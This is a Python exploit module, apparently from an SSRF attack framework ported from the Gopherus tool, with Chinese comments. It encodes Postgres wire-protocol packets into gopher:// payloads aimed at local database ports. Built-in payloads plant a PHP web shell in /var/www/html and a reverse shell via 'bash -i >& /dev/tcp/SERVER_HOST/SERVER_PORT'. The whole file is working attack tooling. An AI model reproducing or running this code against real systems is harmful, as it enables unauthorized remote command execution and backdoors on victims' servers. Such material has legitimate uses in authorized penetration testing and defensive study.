import binascii
import logging

from core.utils import *

# 注意
# 此利用代码是 Gopherus 工具的 Python 3 版本

name = "postgres"
description = "执行 Postgres 命令"
author = "sengkyaut"
documentation = ["https://github.com/tarunkant/Gopherus"]


class exploit:
    user = "postgres"
    database = "postgres"
    reverse = "COPY (SELECT '<?php system(\"bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1\");?>') TO '/var/www/html/shell.php';"
    php_cmd_shell = "COPY (SELECT '<?php system($_GET[\"cmd\"]);?>') TO '/var/www/html/shell.php';"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 获取用户名、数据库和查询语句
        self.user = input("请输入 Postgres 用户名（默认 postgres）: ") or self.user
        self.database = input("请输入 Postgres 数据库名（默认 postgres）: ") or self.database
        query = input(
            "请输入要执行的 Postgres 查询（reverse、phpshell 或任意 Postgres 语句）: "
        )

        # 反弹 shell - 将 system() 写入 /var/www/html/shell.php
        if query == "reverse":
            self.query = self.reverse
            if args.lhost == None:
                self.query = self.query.replace("SERVER_HOST", input("服务器主机:"))
            else:
                self.query = self.query.replace("SERVER_HOST", args.lhost)

            if args.lport == None:
                self.query = self.query.replace("SERVER_PORT", input("服务器端口:"))
            else:
                self.query = self.query.replace("SERVER_PORT", args.lport)

        elif query == "phpshell":
            self.query = self.php_cmd_shell

        else:
            self.query = query

        # 对每个生成的 IP，发送 payload
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            payload = self.get_payload(self.query, ip)
            logging.info(f"生成的 payload : {payload}")

            r = requester.do_request(args.param, payload)

            if query == "reverse" or query == "phpshell":
                logging.info(f"请检查 Web 根目录下的 shell.php 以确认。")

            logging.info(f"模块 '{name}' 已结束！")

    def encode(self, s, ip):
        a = [s[i : i + 2] for i in range(0, len(s), 2)]
        return wrapper_gopher("%" + "%".join(a), ip, "5432")

    def encode_to_hex_str(self, data):
        return binascii.hexlify(data.encode()).decode()

    def get_payload(self, query, ip):
        if query.strip() != "":
            # 对用户名、数据库和查询语句进行编码
            encode_user = self.encode_to_hex_str(self.user)
            encode_db = self.encode_to_hex_str(self.database)
            encode_query = self.encode_to_hex_str(self.query)
            len_query = len(query) + 5

            # 构造 payload
            start = (
                "000000"
                + self.encode_to_hex_str(chr(4 + len(self.user) + 8 + len(self.database) + 13))
                + "000300"
            )
            data = (
                "00"
                + self.encode_to_hex_str("user")
                + "00"
                + encode_user
                + "00"
                + self.encode_to_hex_str("database")
                + "00"
                + encode_db
            )
            data += "0000510000" + str(hex(len_query)[2:]).zfill(4)
            data += encode_query
            end = "005800000004"

            packet = start + data + end
            final = self.encode(packet, ip)
            return final
        else:
            logging.error(f"查询语句不能为空")
            raise Exception("Postgres 查询语句为空！")
